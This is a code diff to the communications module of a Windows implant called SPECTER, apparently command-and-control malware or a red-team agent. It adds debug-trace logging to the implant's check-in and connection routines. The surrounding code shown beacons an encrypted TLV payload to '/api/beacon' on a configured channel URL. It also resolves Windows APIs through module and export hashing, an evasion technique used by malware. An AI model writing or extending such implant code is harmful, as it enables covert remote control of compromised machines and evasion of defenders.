@@ -87,6 +87,27 @@ static DWORD load32_le_comms(const BYTE *p) {
 }
 
 /* ------------------------------------------------------------------ */
+/*  Dev build trace support                                            */
+/* ------------------------------------------------------------------ */
+
+#ifdef SPECTER_DEV_BUILD
+static void comms_dev_trace(const char *msg) {
+    typedef void (__attribute__((ms_abi)) *fn_Dbg)(const char *);
+    static fn_Dbg s_dbg = NULL;
+    static BOOL s_resolved = FALSE;
+    if (!s_resolved) {
+        PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+        if (k32) s_dbg = (fn_Dbg)find_export_by_hash(k32, HASH_OUTPUTDEBUGSTRINGA);
+        s_resolved = TRUE;
+    }
+    if (s_dbg) s_dbg(msg);
+}
+#define COMMS_TRACE(msg) comms_dev_trace(msg)
+#else
+#define COMMS_TRACE(msg) ((void)0)
+#endif
+
+/* ------------------------------------------------------------------ */
 /*  TLV wire format helpers                                            */
 /* ------------------------------------------------------------------ */
 
@@ -1039,6 +1060,7 @@ static void generate_nonce(DWORD seq, const BYTE *pubkey, BYTE nonce[12]) {
 __attribute__((weak))
 #endif
 NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
+    COMMS_TRACE("[SPECTER] checkin: enter");
     if (!ctx || !ctx->config || !ctx->comms_ctx)
         return STATUS_INVALID_PARAMETER;
 
@@ -1047,9 +1069,11 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     if (!cfg) return STATUS_UNSUCCESSFUL;
 
     /* Build plaintext TLV payload */
+    COMMS_TRACE("[SPECTER] checkin: build_payload...");
     BYTE payload[512];
     DWORD payload_len = build_checkin_payload(cfg, comms->msg_seq, payload, sizeof(payload));
     if (payload_len == 0) return STATUS_UNSUCCESSFUL;
+    COMMS_TRACE("[SPECTER] checkin: payload built OK");
 
     NTSTATUS status;
     CHANNEL_CONFIG *ch = &cfg->channels[comms->active_channel];
@@ -1093,6 +1117,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
 
     } else {
         /* ============== Legacy wire format path ============== */
+        COMMS_TRACE("[SPECTER] checkin: legacy wire path");
         spec_memset(payload, 0, sizeof(payload));
         payload_len = build_checkin_payload(cfg, comms->msg_seq, payload, sizeof(payload));
 
@@ -1118,10 +1143,12 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         spec_memcpy(wire_buf + wp, ciphertext, payload_len); wp += payload_len;
         spec_memcpy(wire_buf + wp, tag, AEAD_TAG_SIZE); wp += AEAD_TAG_SIZE;
 
+        COMMS_TRACE("[SPECTER] checkin: building HTTP request");
         http_len = comms_http_build_request(
             COMMS_HTTP_POST, "/api/beacon", ch->url, NULL,
             wire_buf, wire_total, http_buf, sizeof(http_buf));
         if (http_len == 0) return STATUS_UNSUCCESSFUL;
+        COMMS_TRACE("[SPECTER] checkin: HTTP request built, sending...");
     }
 
     /* ---- Send request ---- */
@@ -1697,10 +1724,10 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
     CHANNEL_CONFIG *ch = &cfg->channels[best_idx];
     if (!ch->url[0]) return (NTSTATUS)0xC0000171; /* 171 = no URL */
 
+    COMMS_TRACE("[SPECTER] comms: tcp_connect...");
     status = comms_tcp_connect(&g_comms_ctx, ch->url, ch->port);
     if (!NT_SUCCESS(status)) return (NTSTATUS)0xC0000172; /* 172 = TCP connect */
-
-    /* Checkpoint removed — proceed to checkin */
+    COMMS_TRACE("[SPECTER] comms: tcp_connect OK");
 
     /* TLS handshake — only for channels with https:// scheme */
     if (ch->needs_tls && g_comms_ctx.api.tls_available) {
@@ -1712,6 +1739,7 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
     }
 
     /* Perform initial registration check-in */
+    COMMS_TRACE("[SPECTER] comms: first checkin...");
     g_comms_ctx.state = COMMS_STATE_REGISTERED;
     status = comms_checkin(ctx);
     if (!NT_SUCCESS(status))
